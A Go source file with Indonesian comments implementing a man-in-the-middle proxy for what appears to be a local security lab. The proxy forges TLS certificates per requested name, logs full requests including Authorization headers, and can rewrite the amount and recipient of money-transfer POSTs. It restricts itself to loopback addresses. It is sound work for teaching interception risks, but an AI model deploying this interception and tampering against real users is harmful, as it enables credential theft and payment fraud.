// mitm adalah proxy tiruan di hotspot Dimas (M26): berdiri di antara app dan server tepi, membaca request, boleh
// mengubahnya, lalu meneruskannya ke server asli. Hanya terhadap proses lokal di mesin lab; tidak ada target di luar.
//
//	mitm -listen ADDR -hulu HOST:PORT [-hulu-tls -hulu-ca F] [-tls -ca-cert F -ca-key F] [-rekam F]
//	     [-ubah-nominal N -ubah-ke NOMOR]
//
// Tanpa -tls proxy berbicara HTTP biasa (jaringan tanpa TLS). Dengan -tls ia memalsukan sertifikat untuk nama yang
// diminta app (SNI), ditandatangani CA yang diberikan: CA Dimas, yang tidak dipercaya app kecuali app memasangnya.
// Yang terekam di -rekam (satu JSON per baris) adalah yang dilihat Dimas: handshake yang masuk, dan request lengkap
// dengan header Authorization bila handshake lolos.
package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"lab/t3mitm/internal/pagar"
	"lab/t3mitm/internal/pki"
)

type rekam struct {
	mu sync.Mutex
	f  *os.File
}

func (r *rekam) tulis(v map[string]any) {
	if r.f == nil {
		return
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	b, _ := json.Marshal(v)
	fmt.Fprintf(r.f, "%s\n", b)
}

// ubahKiriman mengganti nominal dan tujuan di body JSON POST /kiriman. Mengembalikan body baru dan apakah berubah.
// nominal 0 dan ke "" berarti tidak diubah.
func ubahKiriman(body []byte, nominal int64, ke string) ([]byte, bool) {
	if nominal == 0 && ke == "" {
		return body, false
	}
	var m map[string]any
	if json.Unmarshal(body, &m) != nil {
		return body, false
	}
	if nominal != 0 {
		m["nominal"] = nominal
	}
	if ke != "" {
		m["ke_nomor_karyawan"] = ke
	}
	b, err := json.Marshal(m)
	if err != nil {
		return body, false
	}
	return b, true
}

// pemalsu membuat sertifikat tiruan untuk nama yang diminta, satu kunci per nama.
type pemalsu struct {
	ca    pki.CA
	mu    sync.Mutex
	cache map[string]*tls.Certificate
}

func (p *pemalsu) untuk(nama string) *tls.Certificate {
	p.mu.Lock()
	defer p.mu.Unlock()
	if c, ok := p.cache[nama]; ok {
		return c
	}
	dns := append([]string{}, pki.NamaDNS...)
	if nama != "" && nama != dns[0] {
		dns = append(dns, nama)
	}
	k := pki.KunciBaru()
	daun := p.ca.Daun(k, dns, pki.NamaIP, time.Now().Add(-5*time.Minute), pki.HariDaun)
	c := &tls.Certificate{Certificate: [][]byte{daun.Raw}, PrivateKey: k}
	p.cache[nama] = c
	return c
}

func main() {
	alamat := flag.String("listen", "", "alamat yang didengarkan proxy")
	hulu := flag.String("hulu", "", "server asli HOST:PORT")
	huluTLS := flag.Bool("hulu-tls", false, "bicara TLS ke server asli")
	huluCA := flag.String("hulu-ca", "", "CA yang memverifikasi server asli (PEM)")
	pakaiTLS := flag.Bool("tls", false, "layani app lewat TLS dengan sertifikat tiruan")
	caCert := flag.String("ca-cert", "", "CA pemalsu: sertifikat (PEM)")
	caKey := flag.String("ca-key", "", "CA pemalsu: kunci (PEM)")
	berkas := flag.String("rekam", "", "berkas rekaman JSON per baris")
	nominal := flag.Int64("ubah-nominal", 0, "ganti nominal POST /kiriman")
	ke := flag.String("ubah-ke", "", "ganti ke_nomor_karyawan POST /kiriman")
	flag.Parse()
	if *alamat == "" || *hulu == "" {
		log.Fatal("GAGAL: -listen dan -hulu wajib")
	}
	for _, a := range []string{*alamat, *hulu} {
		if err := pagar.Loopback(a); err != nil {
			log.Fatal("GAGAL: ", err)
		}
	}
	rk := &rekam{}
	if *berkas != "" {
		f, err := os.OpenFile(*berkas, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
		if err != nil {
			log.Fatal("GAGAL: ", err)
		}
		rk.f = f
	}
	transport := &http.Transport{}
	skema := "http"
	if *huluTLS {
		skema = "https"
		akar := x509.NewCertPool()
		pemCA, err := os.ReadFile(*huluCA)
		if err != nil || !akar.AppendCertsFromPEM(pemCA) {
			log.Fatal("GAGAL: -hulu-ca tidak terbaca")
		}
		transport.TLSClientConfig = &tls.Config{RootCAs: akar, ServerName: "localhost"}
	}
	klien := &http.Client{Transport: transport, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		baru, berubah := body, false
		if r.Method == "POST" && r.URL.Path == "/kiriman" {
			baru, berubah = ubahKiriman(body, *nominal, *ke)
		}
		cat := map[string]any{"jenis": "request", "metode": r.Method, "path": r.URL.Path, "authorization": r.Header.Get("Authorization"), "body": string(body)}
		if berubah {
			cat["body_diteruskan"] = string(baru)
		}
		rk.tulis(cat)
		req, _ := http.NewRequestWithContext(r.Context(), r.Method, skema+"://"+*hulu+r.URL.RequestURI(), bytes.NewReader(baru))
		for k, v := range r.Header {
			req.Header[k] = v
		}
		req.Header.Del("Content-Length")
		req.ContentLength = int64(len(baru))
		req.Host = "localhost"
		res, err := klien.Do(req)
		if err != nil {
			http.Error(w, "proxy: "+err.Error(), http.StatusBadGateway)
			return
		}
		defer res.Body.Close()
		for k, v := range res.Header {
			if strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Connection") {
				continue
			}
			w.Header()[k] = v
		}
		w.WriteHeader(res.StatusCode)
		io.Copy(w, res.Body)
	})

	srv := &http.Server{Addr: *alamat, Handler: handler, ErrorLog: log.New(io.Discard, "", 0)}
	if !*pakaiTLS {
		log.Printf("mitm (tanpa TLS) mendengar di %s", *alamat)
		log.Fatal(srv.ListenAndServe())
	}
	pc, e1 := os.ReadFile(*caCert)
	pk, e2 := os.ReadFile(*caKey)
	if e1 != nil || e2 != nil {
		log.Fatal("GAGAL: -ca-cert dan -ca-key tidak terbaca")
	}
	ca, err := pki.MuatCA(pc, pk)
	if err != nil {
		log.Fatal("GAGAL: ", err)
	}
	pm := &pemalsu{ca: ca, cache: map[string]*tls.Certificate{}}
	srv.TLSConfig = &tls.Config{GetCertificate: func(h *tls.ClientHelloInfo) (*tls.Certificate, error) {
		rk.tulis(map[string]any{"jenis": "handshake", "nama": h.ServerName})
		return pm.untuk(h.ServerName), nil
	}}
	ln, err := net.Listen("tcp", *alamat)
	if err != nil {
		log.Fatal("GAGAL: ", err)
	}
	log.Printf("mitm (TLS palsu) mendengar di %s", *alamat)
	log.Fatal(srv.ServeTLS(ln, "", ""))
}
